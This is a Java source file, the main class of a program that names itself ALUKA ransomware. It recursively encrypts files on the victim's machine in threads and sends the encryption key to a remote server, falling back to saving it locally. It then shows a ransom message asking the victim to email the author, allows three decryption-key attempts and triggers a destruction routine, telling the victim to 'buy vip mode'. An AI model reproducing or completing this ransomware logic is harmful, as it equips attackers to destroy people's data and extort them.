package aluka;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;
import java.util.logging.Level;

import aluka.configuration.Configuration;
import aluka.core.ClientServerManager;
import aluka.core.EncryptionManager;
import aluka.core.FileDeeperBrowser;
import aluka.core.LoggerManagement;
import aluka.core.StateManager;
import aluka.core.SystemManager;
import aluka.destructors.DestructionManager;
import aluka.exception.FileTouchedException;
import aluka.exception.InvalidKeyException;

/**
 * Hello world!
 *
 */
public class App {
	public static final String MODE = "POWERED";

	public static LoggerManagement logger = LoggerManagement.getInstance();
	public static SystemManager system = new SystemManager();
	public static StateManager stateManager = StateManager.getInstance();
	public static EncryptionManager encryptionManager = EncryptionManager.getInstance();

	public static void main(String[] args) {

		/*
		 * if(MODE.equals("POWERED")) { Thread thread = new Thread(new
		 * DownloadTor(system.getOsType())); thread.start(); }
		 */

		// Testing if the machine is already hacked
		if (!stateManager.isPwned()) {
			if (!stateManager.isEncrypted()) {
				// Starting Encryption for files
				FileDeeperBrowser.enableEncryptMode();
				logger.log(Level.WARNING, "Lauching Encryption Process");
				List<Thread> threads = new ArrayList<>();
				for (String path : system.getStartPath()) {
					logger.log(Level.INFO, "Lauching Encryption for " + path);
					Thread thread = new Thread(new FileDeeperBrowser(path, system.getCallback()));
					thread.start();
					threads.add(thread);
				}
				Configuration.waitForThreads(threads, "Wating for file to be encrypted");
				stateManager.markPwned();

				// Export Key
				String key = encryptionManager.destroyKey();
				ClientServerManager myserver = new ClientServerManager();
				try {
					myserver.exportKey(key);
					stateManager.markExported();
				} catch (IOException e) {
					logger.log(Level.WARNING, "Can t make connection between aluka and server");
					try {
						Configuration.saveKey(key);
					} catch (IOException e1) {
						logger.log(Level.SEVERE, "Sorry can not save key your data was lost");
						System.exit(1);
					}
				}
			} else {
				// He is encrypted let s test the key if it was exported
				if (!stateManager.isExported()) {
					String key = "";

					try {
						key = Configuration.loadKey();
					} catch (IOException e1) {
						/*
						 * It means the system can t create a file to store encrypted key and the server
						 * is not open then we lost data in this case
						 */
						logger.log(Level.SEVERE, "Sorry can not save key your data was lost");
						System.exit(1);
					}
					ClientServerManager myserver = new ClientServerManager();
					try {
						myserver.exportKey(key);
						stateManager.markExported();
						stateManager.markPwned();
					} catch (IOException e) {
						logger.log(Level.WARNING, "Can t make connection between aluka and server");
					}
				} else {
					stateManager.markPwned();
				}
			}

		}

		startMechanizmWating();
	}

	public static void startMechanizmWating() {
		System.out.println(
				"Your computer was infected by ALUKA ransomware, your data was encrypted, don't try to remove a file of the virus configuration");
		System.out.println(
				"You have 3 times try to insert a key s please don' try to brute force , contact me at my email");
		try {
			Scanner scanner = new Scanner(System.in);
			DestructionManager destruction = DestructionManager.getInstance();
			while (!destruction.canDestroy()) {
				try {
					System.out.print("KEY>");
					String inputkey = scanner.nextLine();
					encryptionManager.configureDecryptMode(inputkey);
					logger.log(Level.WARNING, "Lauching Decryption Process");
					FileDeeperBrowser.enableDecryptMode();
					List<Thread> threads = new ArrayList<>();
					for (String path : system.getStartPath()) {
						logger.log(Level.INFO, "Lauching Decryption for " + path);
						Thread thread = new Thread(new FileDeeperBrowser(path, system.getCallback()));
						thread.start();
						threads.add(thread);
					}
					Configuration.waitForThreads(threads, "Wating for file to be decrypted");
					scanner.close();
				} catch (InvalidKeyException e) {
					destruction.increment();
				}

			}
			scanner.close();
			System.out.println("Number limited of try you should buy vip mode to recover your data");
		} catch (FileTouchedException e) {
			DestructionManager.clean();
		}

	}

}
